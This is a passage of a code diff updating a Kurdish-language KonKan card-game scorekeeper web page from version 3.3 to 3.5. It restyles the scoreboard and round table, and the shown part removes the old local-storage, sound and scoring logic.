@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<!-- KonKan Scorekeeper — Version 3.3 -->
+<!-- KonKan Scorekeeper — Version 3.5 -->
 <html lang="ckb" dir="rtl">
 <head>
 <meta charset="UTF-8">
@@ -319,107 +319,112 @@
 
   .game-timer{
     direction:ltr;
-    text-align:center;
-    font-size: 34px;
+    display:flex; align-items:center; gap:7px;
+    font-size: 15px;
     font-weight: 800;
     color: var(--copper-deep);
     font-variant-numeric: tabular-nums;
-    letter-spacing: 0.02em;
-    margin: 2px 0 16px;
-  }
-
-  /* ---------- Scoreboard (tug-of-war bar) ---------- */
-  @property --p{ syntax:'<percentage>'; inherits:true; initial-value:50%; }
-  :root{ --t1:#d2452f; --t2:#2a68b8; }
-  .scoreboard{
     background: var(--card);
     border: 1px solid var(--border);
-    border-radius: var(--radius);
-    box-shadow: var(--shadow);
-    padding: 18px 16px 16px;
-    margin-bottom: 18px;
-  }
-  .sb-top{
-    display:flex;
-    justify-content:space-between;
-    align-items:flex-start;
-    gap:12px;
-    margin-bottom: 14px;
-  }
-  .sb-side{
-    display:flex;
-    flex-direction:column;
-    min-width:0;
-    max-width:48%;
-    opacity:.5;
-    transition: opacity .3s ease, transform .3s ease;
-  }
-  .sb-side1{ align-items:flex-start; }
-  .sb-side2{ align-items:flex-end; }
-  .sb-side.leading, .sb-top.tied .sb-side{ opacity:1; }
-  .sb-name-line{ display:flex; align-items:center; gap:8px; min-width:0; max-width:100%; }
-  .sb-dot{ width:11px;height:11px;border-radius:50%; flex-shrink:0; }
-  .sb-side1 .sb-dot{ background: var(--t1); }
-  .sb-side2 .sb-dot{ background: var(--t2); }
-  .sb-name{
-    font-weight: 700;
-    font-size: 16px;
-    overflow:hidden;
-    text-overflow:ellipsis;
-    white-space:nowrap;
-  }
-  .sb-score{
-    font-weight: 800;
-    font-size: 44px;
-    line-height:1.1;
-    margin-top: 4px;
-    direction:ltr;
-    font-variant-numeric: tabular-nums;
-    transition: color .3s ease;
-  }
-  .sb-side1 .sb-score{ color: var(--t1); }
-  .sb-side2 .sb-score{ color: var(--t2); }
-  .sb-bar{
-    position:relative;
-    height: 18px;
+    padding: 9px 13px;
     border-radius: 999px;
-    --p: 50%;
-    background: linear-gradient(to left,
-      var(--t1) 0%,
-      var(--t1) max(0%, calc(var(--p) - 10%)),
-      var(--t2) min(100%, calc(var(--p) + 10%)),
-      var(--t2) 100%);
-    transition: --p .6s cubic-bezier(.3,.7,.2,1);
-    box-shadow: inset 0 1px 3px rgba(0,0,0,.18);
   }
-  .sb-lead-text{
-    text-align:center;
-    margin-top: 14px;
-    font-size: 13px;
-    font-weight: 600;
-    color: var(--olive);
-    background: var(--olive-tint);
-    border-radius: 999px;
-    padding: 7px 10px;
+  .game-timer::before{
+    content:""; width:7px; height:7px; border-radius:50%;
+    background:#3f9d5a; box-shadow:0 0 0 3px rgba(63,157,90,.18);
   }
+  .game-timer.stopped::before{ background:#b8a592; box-shadow:none; }
 
-  .sb-final-head{
-    display:flex; align-items:center; justify-content:center; gap:8px;
-    font-size:14px; font-weight:700; color: var(--charcoal-soft);
-    margin-bottom: 12px;
+  /* ---------- Hero: who needs how many points ---------- */
+  :root{ --t1:#d2452f; --t2:#2a68b8; --t1-soft:#ff8f78; --t2-soft:#86b6f2; }
+  .need-card{
+    position:relative; overflow:hidden;
+    background:#5c3b2c; color:#f5ece0;
+    border-radius:26px;
+    padding:20px 18px 20px;
+    text-align:center;
+    box-shadow: var(--shadow-lg);
+    margin-bottom:12px;
+    display:flex; flex-direction:column; align-items:center;
   }
-  .sb-trophy{ color: var(--copper); display:flex; }
-  .sb-trophy svg{ width:22px; height:22px; }
-  .scoreboard.final{ animation: pop .35s ease; border-color:#dcc3a6; }
-  .scoreboard.final .sb-lead-text{
-    background: var(--copper-tint);
-    color: var(--copper-deep);
-    border: 1px solid #dcc3a6;
-    font-size: 14.5px;
-    font-weight: 800;
+  .need-card::before{
+    content:""; position:absolute; left:50%; top:-120%;
+    width:140%; aspect-ratio:1; transform:translateX(-50%);
+    border-radius:50%; background:#664735; border:1px solid #7b5841;
   }
+  .need-card > *{ position:relative; }
+  .need-card .dot{ width:13px; height:13px; border-radius:50%; flex-shrink:0; display:inline-block; }
+  .need-card .dot.t1{ background:var(--t1-soft); }
+  .need-card .dot.t2{ background:var(--t2-soft); }
+  .need-who{
+    display:inline-flex; align-items:center; gap:9px; max-width:100%;
+    font-size:24px; font-weight:800; line-height:1.3;
+  }
+  .need-who .nm{ overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+  .need-label{ font-size:15px; font-weight:600; color:#e8d9c6; opacity:.9; }
+  .need-num{
+    display:flex; align-items:baseline; justify-content:center; gap:10px;
+    line-height:1; margin:6px 0 2px;
+  }
+  .need-num b{
+    font-size:88px; font-weight:800; letter-spacing:-.02em;
+    font-variant-numeric: tabular-nums; direction:ltr;
+  }
+  .need-num span{ font-size:24px; font-weight:800; color:#e3bd92; }
+  .need-sub{
+    display:inline-flex; align-items:center; gap:7px;
+    margin-top:12px; font-size:14px; font-weight:700;
+    background:rgba(243,235,221,.12); border:1px solid rgba(243,235,221,.22);
+    padding:7px 14px; border-radius:999px; max-width:100%;
+  }
+  .need-sub .dot{ width:9px; height:9px; }
+  .need-msg{ font-size:20px; font-weight:800; margin-top:6px; }
+  .need-hint{ font-size:13.5px; color:#e8d9c6; opacity:.8; margin-top:4px; }
+  .need-winner{
+    display:inline-flex; align-items:center; gap:10px; max-width:100%;
+    font-size:40px; font-weight:800; line-height:1.25; margin-top:2px;
+  }
+  .need-winner .nm{ overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+  .need-trophy{ color:#e3bd92; display:flex; justify-content:center; margin-bottom:2px; }
+  .need-trophy svg{ width:38px; height:38px; }
+  @keyframes needBump{ 0%{ transform:scale(.96); } 55%{ transform:scale(1.025); } 100%{ transform:scale(1); } }
+  .need-card.bump{ animation: needBump .45s ease; }
+
+  /* ---------- Team total cards ---------- */
+  .teams{
+    display:grid; grid-template-columns:1fr 1fr; gap:10px;
+    margin-bottom:16px;
+  }
+  .tcard{
+    --tc: var(--t1);
+    position:relative; min-width:0;
+    background: var(--card);
+    border:1.5px solid var(--border);
+    border-top:5px solid var(--tc);
+    border-radius:18px;
+    padding:12px 14px 10px;
+    transition: background .3s ease, border-color .3s ease;
+  }
+  .tcard.t2{ --tc: var(--t2); }
+  .tc-name{ display:flex; align-items:center; gap:7px; min-width:0; font-weight:700; font-size:15px; }
+  .tc-name .sb-dot{ width:10px; height:10px; border-radius:50%; background:var(--tc); flex-shrink:0; }
+  .tc-name .sb-name{ overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+  .tc-score{
+    font-size:40px; font-weight:800; line-height:1.15; margin-top:4px;
+    color: var(--tc); direction:ltr; text-align:right;
+    font-variant-numeric: tabular-nums;
+  }
+  .tc-chip{
+    display:none; position:absolute; top:-12px; left:10px;
+    font-size:11.5px; font-weight:800; color:#fff;
+    background: var(--tc); padding:3px 10px; border-radius:999px;
+  }
+  .tcard.leading .tc-chip{ display:inline-block; }
+  .tcard.t1.leading{ background:#fdf0ec; border-color:#f2c3b8; border-top-color:var(--t1); }
+  .tcard.t2.leading{ background:#edf3fc; border-color:#bcd2f0; border-top-color:var(--t2); }
+
   /* ---------- Game progress ---------- */
-  .progress{ margin: -4px 2px 16px; }
+  .progress{ margin: 0 2px 16px; }
   .progress-text{
     display:flex; justify-content:space-between; align-items:center;
     font-size:12.5px; font-weight:700; color: var(--charcoal-soft); margin-bottom:7px;
@@ -438,16 +443,18 @@
   .pseg.current{ border-color: var(--copper); animation: segPulse 1.6s ease-in-out infinite; }
 
   .konkan-notice{
+    display:flex; align-items:center; justify-content:center; gap:8px;
     text-align:center;
-    font-size: 13.5px;
-    font-weight: 700;
-    color: var(--copper-deep);
-    background: var(--copper-tint);
-    border: 1px solid #dcc3a6;
-    border-radius: 14px;
-    padding: 11px 14px;
-    margin-bottom: 16px;
+    font-size: 16px;
+    font-weight: 800;
+    color: #8f2a17;
+    background: #fbe3da;
+    border: 1.5px solid #eeb09e;
+    border-radius: 16px;
+    padding: 12px 14px;
+    margin-bottom: 12px;
   }
+  .konkan-notice::before{ content:"⚠"; font-size:18px; margin-inline-end:2px; }
 
   /* ---------- Round table ---------- */
   .rounds-label{
@@ -517,6 +524,15 @@
     cursor: default;
     pointer-events: none;
   }
+  .round-row.current{
+    border:2px solid var(--copper);
+    box-shadow: 0 6px 18px rgba(92,59,44,.14);
+  }
+  .round-row.current .round-tag{ color: var(--copper-deep); font-weight:800; }
+  .round-row.current .round-cell.empty{ color: var(--copper); font-size:24px; font-weight:700; }
+  .round-row.locked{ background:transparent; border-style:dashed; }
+  .round-row.locked .round-cell{ background:transparent; padding:9px 6px; font-size:15px; }
+  .round-row.locked .round-tag{ opacity:.55; }
   .round-cell.round-cell-gharbat{
     color: var(--olive);
     font-size: 13.5px;
@@ -625,6 +641,12 @@
     transition: border-color .15s ease;
   }
   .score-input-group input.active-input{ border-color: var(--copper); }
+  #scoreLabel1, #scoreLabel2{ display:flex; align-items:center; gap:8px; font-size:15px; color:var(--charcoal); }
+  #scoreLabel1::before, #scoreLabel2::before{ content:""; width:10px; height:10px; border-radius:50%; flex-shrink:0; }
+  #scoreLabel1::before{ background:var(--t1); }
+  #scoreLabel2::before{ background:var(--t2); }
+  #scoreInput1.active-input{ border-color:var(--t1); box-shadow:0 0 0 3px rgba(210,69,47,.12); }
+  #scoreInput2.active-input{ border-color:var(--t2); box-shadow:0 0 0 3px rgba(42,104,184,.12); }
 
   .quick-scores{
     display:grid;
@@ -1007,6 +1029,7 @@
 <section id="scoreScreen" class="screen">
   <div class="topbar">
     <div class="brand-mini">Kon<span class="k2">Kan</span></div>
+    <div class="game-timer" id="gameTimer">00:00</div>
     <div class="topbar-actions">
       <button class="icon-btn" id="homeBtn" aria-label="گەڕانەوە بۆ سەرەتا" title="سەرەتا"></button>
       <button class="icon-btn" id="soundBtn" aria-label="دەنگ" title="دەنگ"></button>
@@ -1015,30 +1038,28 @@
   </div>
 
   <div class="match-label" id="matchLabel" style="display:none;"></div>
-  <div class="game-timer" id="gameTimer">00:00</div>
 
-  <div class="scoreboard" id="scoreboard">
-    <div class="sb-final-head" id="sbFinalHead" style="display:none;"><span class="sb-trophy" id="trophyIcon"></span><span>ئەنجامی یاری</span></div>
-    <div class="sb-top" id="sbTop">
-      <div class="sb-side sb-side1" id="sbRow1">
-        <div class="sb-name-line"><span class="sb-dot"></span><span class="sb-name" id="sbName1"></span></div>
-        <div class="sb-score" id="sbScore1">0</div>
-      </div>
-      <div class="sb-side sb-side2" id="sbRow2">
-        <div class="sb-name-line"><span class="sb-dot"></span><span class="sb-name" id="sbName2"></span></div>
-        <div class="sb-score" id="sbScore2">0</div>
-      </div>
+  <div class="need-card" id="needCard" aria-live="polite"></div>
+
+  <div class="konkan-notice" id="konkanNotice" style="display:none;"></div>
+
+  <div class="teams" id="scoreboard">
+    <div class="tcard t1" id="sbRow1">
+      <span class="tc-chip">لە پێشە</span>
+      <div class="tc-name"><span class="sb-dot"></span><span class="sb-name" id="sbName1"></span></div>
+      <div class="tc-score" id="sbScore1">0</div>
     </div>
-    <div class="sb-bar" id="sbBar"></div>
-    <div class="sb-lead-text" id="sbLeadText" style="display:none;"></div>
+    <div class="tcard t2" id="sbRow2">
+      <span class="tc-chip">لە پێشە</span>
+      <div class="tc-name"><span class="sb-dot"></span><span class="sb-name" id="sbName2"></span></div>
+      <div class="tc-score" id="sbScore2">0</div>
+    </div>
   </div>
 
   <div class="progress" id="gameProgress">
     <div class="progress-text"><span id="progressLeft"></span><span id="progressRight"></span></div>
     <div class="progress-segs" id="progressSegs"></div>
   </div>
-
-  <div class="konkan-notice" id="konkanNotice" style="display:none;"></div>
 
   <div class="round-header" id="roundHeader">
     <div></div>
@@ -1136,1725 +1157,16 @@
 
 <script>
 (function(){
-  "use strict";
-
-  /* ---------------- Icons ---------------- */
-  var ICONS = {
-    history: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 1 0 3-6.7"/><path d="M3 3v5h5"/><path d="M12 7v5l3.5 2"/></svg>',
-    undo: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M4 10h10a5 5 0 0 1 0 10h-2"/><path d="M4 10l4-4M4 10l4 4"/></svg>',
-    close: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M6 6l12 12M18 6L6 18"/></svg>',
-    trophy: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M8 4h8v5a4 4 0 0 1-8 0V4Z"/><path d="M8 5H5a3 3 0 0 0 3 5"/><path d="M16 5h3a3 3 0 0 1-3 5"/><path d="M12 13v3"/><path d="M9 20h6"/><path d="M10 17h4v3h-4z"/></svg>',
-    trash: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M4 7h16"/><path d="M9 7V4h6v3"/><path d="M6 7l1 13h10l1-13"/><path d="M10 11v6M14 11v6"/></svg>',
-    soundOn: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M4 9v6h4l5 4V5L8 9H4Z"/><path d="M17 8a5 5 0 0 1 0 8"/><path d="M19.5 5.5a9 9 0 0 1 0 13"/></svg>',
-    soundOff: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M4 9v6h4l5 4V5L8 9H4Z"/><path d="M16 9l5 6M21 9l-5 6"/></svg>',
-    home: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11l8-7 8 7"/><path d="M6 10v9h12v-9"/><path d="M10 19v-5h4v5"/></svg>',
-    share: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 15V4"/><path d="M8 8l4-4 4 4"/><path d="M5 13v6a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-6"/></svg>'
-  };
-
-  var EASTERN_DIGITS = ["0","1","2","3","4","5","6","7","8","9"];
-  function toEastern(n){
-    return String(n).replace(/[0-9]/g, function(d){ return EASTERN_DIGITS[+d]; });
-  }
-
-  /* ---------------- Storage keys ---------------- */
-  var K_GAME = "konkan_current_game";
-  var K_HISTORY = "konkan_history";
-  var K_SOUND = "konkan_sound";
-  var K_TOURN = "konkan_tournament";
-  var K_VIEW = "konkan_view";
-
-  /* ---------------- State ---------------- */
-  var gameState = null;   // { team1Name, team2Name, rounds, roundsData:[{t1,t2}], sound }
-  var undoStack = [];
-  var activeRoundIndex = null;
-  var activeInputEl = null;
-
-  /* ---------------- Helpers ---------------- */
-  function $(id){ return document.getElementById(id); }
-  function showScreen(id){
-    document.querySelectorAll(".screen").forEach(function(s){ s.classList.remove("active"); });
-    $(id).classList.add("active");
-    if(id === "setupScreen" && typeof refreshResumeBox === "function") refreshResumeBox();
-    window.scrollTo(0,0);
-  }
-  function showToast(msg){
-    var t = $("toast");
-    t.textContent = msg;
-    t.classList.add("show");
-    clearTimeout(showToast._tm);
-    showToast._tm = setTimeout(function(){ t.classList.remove("show"); }, 1600);
-  }
-
-  /* ---------------- Sound ---------------- */
-  var audioCtx = null;
-  function getAudioCtx(){
-    if(!audioCtx){
-      try{ audioCtx = new (window.AudioContext || window.webkitAudioContext)(); }catch(e){ audioCtx = null; }
-    }
-    return audioCtx;
-  }
-  function playTone(freq, dur, vol){
-    if(!gameState || !gameState.sound) return;
-    var ctx = getAudioCtx();
-    if(!ctx) return;
-    var osc = ctx.createOscillator();
-    var gain = ctx.createGain();
-    osc.type = "sine";
-    osc.frequency.value = freq;
-    gain.gain.value = vol || 0.06;
-    osc.connect(gain);
-    gain.connect(ctx.destination);
-    var now = ctx.currentTime;
-    gain.gain.setValueAtTime(gain.gain.value, now);
-    gain.gain.exponentialRampToValueAtTime(0.0001, now + dur);
-    osc.start(now);
-    osc.stop(now + dur);
-  }
-  function soundClick(){ playTone(520, 0.07, 0.05); }
-  function soundConfirm(){ playTone(660, 0.08, 0.06); setTimeout(function(){ playTone(880,0.1,0.05); }, 70); }
-
-  /* ---------------- Durable storage (localStorage + IndexedDB mirror) ---------------- */
-  var idbRef = null;
-  function openMirror(cb){
-    try{
-      var req = indexedDB.open("konkan_db", 1);
-      req.onupgradeneeded = function(){ try{ req.result.createObjectStore("kv"); }catch(e){} };
-      req.onsuccess = function(){ idbRef = req.result; cb(); };
-      req.onerror = function(){ cb(); };
-      req.onblocked = function(){ cb(); };
-    }catch(e){ cb(); }
-  }
-  function mirrorSet(key, val){
-    if(!idbRef) return;
-    try{ idbRef.transaction("kv","readwrite").objectStore("kv").put(val, key); }catch(e){}
-  }
-  function mirrorRemove(key){
-    if(!idbRef) return;
-    try{ idbRef.transaction("kv","readwrite").objectStore("kv").delete(key); }catch(e){}
-  }
-  function lsSet(key, val){
-    try{ localStorage.setItem(key, val); }catch(e){}
-    mirrorSet(key, val);
-  }
-  function lsRemove(key){
-    try{ localStorage.removeItem(key); }catch(e){}
-    mirrorRemove(key);
-  }
-  // If the browser wiped localStorage but IndexedDB survived, bring the data back.
-  function restoreFromMirror(done){
-    var finished = false;
-    function finish(){ if(finished) return; finished = true; done(); }
-    setTimeout(finish, 1500);
-    try{
-      if(navigator.storage && navigator.storage.persist){ navigator.storage.persist(); }
-    }catch(e){}
-    openMirror(function(){
-      if(!idbRef){ finish(); return; }
-      var keys = [K_GAME, K_HISTORY, K_SOUND, K_LAST, K_TOURN, K_VIEW];
-      var left = keys.length;
-      keys.forEach(function(k){
-        var have = null;
-        try{ have = localStorage.getItem(k); }catch(e){}
-        if(have !== null){ mirrorSet(k, have); if(--left === 0) finish(); return; }
-        try{
-          var r = idbRef.transaction("kv","readonly").objectStore("kv").get(k);
-          r.onsuccess = function(){
-            if(r.result !== undefined){ try{ localStorage.setItem(k, r.result); }catch(e){} }
-            if(--left === 0) finish();
-          };
-          r.onerror = function(){ if(--left === 0) finish(); };
-        }catch(e){ if(--left === 0) finish(); }
-      });
-    });
-  }
-
-  /* ---------------- Persistence ---------------- */
-  function saveCurrentGame(){
-    if(currentMatchId && T){ saveTournament(); return; }
-    try{ lsSet(K_GAME, JSON.stringify(gameState)); }catch(e){}
-  }
-  function loadCurrentGame(){
-    try{
-      var raw = localStorage.getItem(K_GAME);
-      return raw ? JSON.parse(raw) : null;
-    }catch(e){ return null; }
-  }
-  function clearCurrentGame(){
-    try{ lsRemove(K_GAME); }catch(e){}
-  }
-  function loadHistory(){
-    try{
-      var raw = localStorage.getItem(K_HISTORY);
-      return raw ? JSON.parse(raw) : [];
-    }catch(e){ return []; }
-  }
-  function saveGameHistory(entry){
-    var h = loadHistory();
-    h.unshift(entry);
-    if(h.length > 100) h = h.slice(0,100);
-    try{ lsSet(K_HISTORY, JSON.stringify(h)); }catch(e){}
-  }
-  function deleteHistoryGame(index){
-    var h = loadHistory();
-    h.splice(index,1);
-    try{ lsSet(K_HISTORY, JSON.stringify(h)); }catch(e){}
-  }
-
-  /* ---------------- Game logic ---------------- */
-  function createRounds(count){
-    var arr = [];
-    for(var i=0;i<count;i++){ arr.push({ t1:null, t2:null }); }
-    return arr;
-  }
-
-  function calculateTotals(){
-    var t1 = 0, t2 = 0;
-    gameState.roundsData.forEach(function(r){
-      if(r.t1 !== null && r.t1 !== undefined) t1 += r.t1;
-      if(r.t2 !== null && r.t2 !== undefined) t2 += r.t2;
-    });
-    return { t1: t1, t2: t2 };
-  }
-
-  function isGameComplete(){
-    var status = getRoundCheckStatus();
-    if(status && status.type === "lost") return true;
-    return gameState.roundsData.every(function(r){
-      return r.t1 !== null && r.t1 !== undefined && r.t2 !== null && r.t2 !== undefined;
-    });
-  }
-
-  // Checks the KonKan rule at the checkpoint round (the originally selected
-  // round count, i.e. one round before the extra bonus round).
-  var MAX_ROUND_POINTS = 400;   // highest score one team can get in a single round
-
-  function getRoundCheckStatus(){
-    // Early loss: the most a team can gain on the other in one round is
-    // MAX_ROUND_POINTS. If the gap can no longer be overturned by the rounds
-    // that are left, the team behind has already lost.
-    var totalRounds = gameState.roundsData.length;
-    var e1 = 0, e2 = 0;
-    for(var k=0; k<totalRounds; k++){
-      var er = gameState.roundsData[k];
-      if(er.t1 === null || er.t1 === undefined || er.t2 === null || er.t2 === undefined) break;
-      e1 += er.t1; e2 += er.t2;
-      var remaining = totalRounds - (k+1);
-      if(remaining <= 0) break;
-      var gap = Math.abs(e1 - e2);
-      if(gap > 0 && gap + 1 > MAX_ROUND_POINTS * remaining){
-        return { type:"lost", team: e1 > e2 ? "team1" : "team2", checkpointRound: k+1, totals:{ t1:e1, t2:e2 } };
-      }
-    }
-
-    var checkpointRound = gameState.rounds - 1;
-    if(checkpointRound < 1) return null;
-    var r = gameState.roundsData[checkpointRound - 1];
-    if(!r || r.t1 === null || r.t1 === undefined || r.t2 === null || r.t2 === undefined) return null;
-
-    var t1 = 0, t2 = 0;
-    for(var i=0; i<checkpointRound; i++){
-      var rr = gameState.roundsData[i];
-      if(rr.t1 !== null && rr.t1 !== undefined) t1 += rr.t1;
-      if(rr.t2 !== null && rr.t2 !== undefined) t2 += rr.t2;
-    }
-    var diff = Math.abs(t1-t2);
-    var worseTeam = t1 > t2 ? "team1" : (t2 > t1 ? "team2" : null);
-    if(!worseTeam) return null;
-
-    // Lost only if the gap is bigger than 400: a 400 (konkan) in the last
-    // round could still flip the result when the gap is 400 or less.
-    if(diff > 400){
-      return { type:"lost", team: worseTeam, checkpointRound: checkpointRound, totals:{ t1:t1, t2:t2 } };
-    }
-    if(diff >= 200){
-      return { type:"mandatory", team: worseTeam, checkpointRound: checkpointRound };
-    }
-    return null;
-  }
-
-  function updateNotice(){
-    var el = $("konkanNotice");
-    var status = getRoundCheckStatus();
-    if(status && status.type === "mandatory" && !isGameComplete()){
-      var teamName = status.team === "team1" ? gameState.team1Name : gameState.team2Name;
-      el.textContent = teamName + " کۆنکان ئیجبارە";
-      el.style.display = "block";
-    } else {
-      el.style.display = "none";
-    }
-  }
-
-  function startGame(team1, team2, selectedRoundsCount){
-    archiveUnfinished();
-    var actualRounds = selectedRoundsCount + 1; // one extra round is always added during play
-    gameState = {
-      team1Name: team1,
-      team2Name: team2,
-      rounds: actualRounds,
-      roundsData: createRounds(actualRounds),
-      sound: gameState ? gameState.sound : true,
-      historySaved: false,
-      startedAt: Date.now()
-    };
-    undoStack = [];
-    currentMatchId = null;
-    lsSet(K_VIEW, "q");
-    saveCurrentGame();
-    renderScoreScreen();
-    showScreen("scoreScreen");
-    requestWakeLock();
-  }
-
-  function startNewGame(){
-    archiveUnfinished();
-    gameState.roundsData = createRounds(gameState.rounds);
-    gameState.historySaved = false;
-    gameState.startedAt = Date.now();
-    undoStack = [];
-    saveCurrentGame();
-    renderScoreScreen();
-    showToast("یاری نوێ دەستیپێکرد");
-    requestWakeLock();
-  }
-
-  function hasAnyScore(){
-    return !!(gameState && gameState.roundsData && gameState.roundsData.some(function(r){
-      return (r.t1 !== null && r.t1 !== undefined) || (r.t2 !== null && r.t2 !== undefined);
-    }));
-  }
-
-  // A game that was left before the end is still kept in history (marked unfinished)
-  function archiveUnfinished(){
-    if(!gameState || !gameState.roundsData || gameState.historySaved) return;
-    if(!hasAnyScore()) return;
-    var totals = calculateTotals();
-    saveGameHistory({
-      team1Name: gameState.team1Name,
-      team2Name: gameState.team2Name,
-      total1: totals.t1,
-      total2: totals.t2,
-      rounds: gameState.rounds,
-      date: new Date().toISOString(),
-      finished: false,
-      durationMs: gameState.startedAt ? Date.now() - gameState.startedAt : 0
-    });
-    gameState.historySaved = true;
-  }
-
-  function finalizeIfComplete(){
-    if(gameState.historySaved) return;
-    if(isGameComplete()){
-      var totals = calculateTotals();
-      saveGameHistory({
-        team1Name: gameState.team1Name,
-        team2Name: gameState.team2Name,
-        total1: totals.t1,
-        total2: totals.t2,
-        rounds: gameState.rounds,
-        date: new Date().toISOString(),
-        finished: true,
-        tournament: (currentMatchId && T) ? T.name : "",
-        durationMs: gameState.startedAt ? Date.now() - gameState.startedAt : 0
-      });
-      gameState.historySaved = true;
-      saveCurrentGame();
-    }
-  }
-
-  /* ---------------- Rendering ---------------- */
-  function updateScoreboard(){
-    var totals = calculateTotals();
-    $("sbName1").textContent = gameState.team1Name;
-    $("sbName2").textContent = gameState.team2Name;
-    $("sbScore1").textContent = toEastern(totals.t1);
-    $("sbScore2").textContent = toEastern(totals.t2);
-
-    var leadText = $("sbLeadText");
-
-    if(totals.t1 === 0 && totals.t2 === 0){
-      leadText.style.display = "none";
-    } else if(totals.t1 === totals.t2){
-      leadText.style.display = "block";
-      leadText.textContent = "یارییەکە یەکسانە";
-    } else {
-      var diffPlusOne = Math.abs(totals.t1 - totals.t2) + 1;
-      var worseName = totals.t1 > totals.t2 ? gameState.team1Name : gameState.team2Name;
-      leadText.style.display = "block";
-      leadText.textContent = worseName + " پێویستی بە " + toEastern(diffPlusOne) + " خاڵە";
-    }
-
-    var share1 = (totals.t1 + totals.t2) === 0 ? 50 : (totals.t2 / (totals.t1 + totals.t2)) * 100;
-    share1 = Math.max(6, Math.min(94, share1));
-    $("sbBar").style.setProperty("--p", share1 + "%");
-    $("sbTop").classList.toggle("tied", totals.t1 === totals.t2);
-
-    $("sbRow1").classList.remove("leading");
-    $("sbRow2").classList.remove("leading");
-    if(totals.t1 !== totals.t2 && !(totals.t1===0 && totals.t2===0)){
-      if(totals.t1 < totals.t2) $("sbRow1").classList.add("leading");
-      else $("sbRow2").classList.add("leading");
-    }
-  }
-
-  function getSequentialLockIndex(){
-    for(var i=0;i<gameState.roundsData.length;i++){
-      var r = gameState.roundsData[i];
-      if(r.t1===null||r.t1===undefined||r.t2===null||r.t2===undefined){
-        return i;
-      }
-    }
-    return gameState.roundsData.length;
-  }
-
-  function renderRoundList(){
-    var list = $("roundList");
-    list.innerHTML = "";
-    var status = getRoundCheckStatus();
-    var lockAfter = (status && status.type === "lost") ? status.checkpointRound : null;
-    var seqLockIndex = getSequentialLockIndex();
-    var tLocked = tournamentLocked();
-
-    gameState.roundsData.forEach(function(r, idx){
-      var row = document.createElement("div");
-      row.className = "round-row";
-      var isLocked = (lockAfter && (idx+1) > lockAfter) || (idx > seqLockIndex) || tLocked;
-      var isGharbat = r.gharbat === true;
-
-      var tag = document.createElement("div");
-      tag.className = "round-tag";
-      tag.textContent = "ت " + toEastern(idx+1);
-
-      var c1 = document.createElement("button");
-      c1.type = "button";
-      c1.className = "round-cell" + (r.t1===null||r.t1===undefined ? " empty" : "") + (isLocked ? " round-cell-disabled" : "") + (isGharbat ? " round-cell-gharbat" : "");
-      c1.textContent = isGharbat ? "غەربەت" : ((r.t1===null||r.t1===undefined) ? "—" : toEastern(r.t1));
-      c1.setAttribute("aria-label", gameState.team1Name + " ت" + toEastern(idx+1));
-      if(!isLocked) c1.addEventListener("click", function(){ openScoreModal(idx, "t1"); });
-
-      var c2 = document.createElement("button");
-      c2.type = "button";
-      c2.className = "round-cell" + (r.t2===null||r.t2===undefined ? " empty" : "") + (isLocked ? " round-cell-disabled" : "") + (isGharbat ? " round-cell-gharbat" : "");
-      c2.textContent = isGharbat ? "غەربەت" : ((r.t2===null||r.t2===undefined) ? "—" : toEastern(r.t2));
-      c2.setAttribute("aria-label", gameState.team2Name + " ت" + toEastern(idx+1));
-      if(!isLocked) c2.addEventListener("click", function(){ openScoreModal(idx, "t2"); });
-
-      row.appendChild(tag);
-      row.appendChild(c1);
-      row.appendChild(c2);
-      list.appendChild(row);
-    });
-  }
-
-  function showFinalResult(){
-    var head = $("sbFinalHead");
-    var lead = $("sbLeadText");
-    var sb = $("scoreboard");
-    var status = getRoundCheckStatus();
-    var lost = status && status.type === "lost";
-
-    if(!lost && !isGameComplete()){
-      head.style.display = "none";
-      sb.classList.remove("final");
-      return;
-    }
-
-    head.style.display = "flex";
-    $("trophyIcon").innerHTML = ICONS.trophy;
-    sb.classList.add("final");
-
-    var verdict;
-    if(lost){
-      var loserName = status.team === "team1" ? gameState.team1Name : gameState.team2Name;
-      verdict = loserName + " دۆڕا — لە تەڵقەی " + toEastern(status.checkpointRound) + "دا";
-    } else {
-      var totals = calculateTotals();
-      if(totals.t1 === totals.t2){
-        verdict = "یارییەکە یەکسانە";
-      } else if(totals.t1 < totals.t2){
-        verdict = gameState.team1Name + " بە " + toEastern(totals.t2-totals.t1) + " خاڵ پێشە";
-      } else {
-        verdict = gameState.team2Name + " بە " + toEastern(totals.t1-totals.t2) + " خاڵ پێشە";
-      }
-    }
-    lead.style.display = "block";
-    lead.textContent = verdict;
-  }
-
-  /* ---------------- Game progress bar ---------------- */
-  function renderProgress(){
-    var total = gameState.roundsData.length;
-    var status = getRoundCheckStatus();
-    var lost = status && status.type === "lost";
-    var lockAfter = lost ? status.checkpointRound : null;
-    var complete = isGameComplete();
-
-    var played = 0, currentIdx = -1;
-    gameState.roundsData.forEach(function(r, i){
-      var filled = r.t1 !== null && r.t1 !== undefined && r.t2 !== null && r.t2 !== undefined;
-      if(filled) played++;
-      else if(currentIdx === -1) currentIdx = i;
-    });
-
-    var segs = $("progressSegs");
-    segs.innerHTML = "";
-    gameState.roundsData.forEach(function(r, i){
-      var seg = document.createElement("div");
-      var cls = "pseg";
